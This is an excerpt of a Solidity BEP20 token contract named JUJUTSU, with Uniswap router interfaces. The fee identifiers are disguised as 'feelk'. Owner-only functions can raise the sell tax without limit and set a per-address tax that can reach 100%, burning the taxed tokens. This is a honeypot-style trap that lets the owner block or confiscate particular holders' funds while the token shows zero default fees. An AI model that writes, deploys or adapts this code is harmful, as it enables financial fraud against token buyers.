...
interface IUniswapV2Factory {
    ...
    function feelkTo() external view returns (address);
    function feelkToSetter() external view returns (address);
    ...
    function setfeelkTo(address) external;
    function setfeelkToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeelkOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeelkOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeelkOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeelkOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeelkOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract JUJUTSU is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeelk = 0;

    uint256 private _defaultBuyfeelk = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeelk;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeelk = _value;
    }

    function setSlipfeelk(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeelk[_address] = _value;
    }

    function getSlipfeelk(address _address) external view onlyownar returns (uint256) {
        return _slipfeelk[_address];
    }


    function setMAccountfeelk(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeelk(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeelkAmount = 0;

        if (rF) {
            uint256 tradefeelk = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeelk = _defaultSellfeelk;
                }
                if (from == uniswapV2Pair) {

                    tradefeelk = _defaultBuyfeelk;
                }
            }
            if (_slipfeelk[from] > 0) {
                tradefeelk = _slipfeelk[from];
            }

            tradefeelkAmount = _Amount.mul(tradefeelk).div(100);
        }


        if (tradefeelkAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeelkAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeelkAmount);
            emit Transfer(from, _deadAddress, tradefeelkAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeelkAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeelkAmount);
        emit Transfer(from, _to, _Amount - tradefeelkAmount);
    }
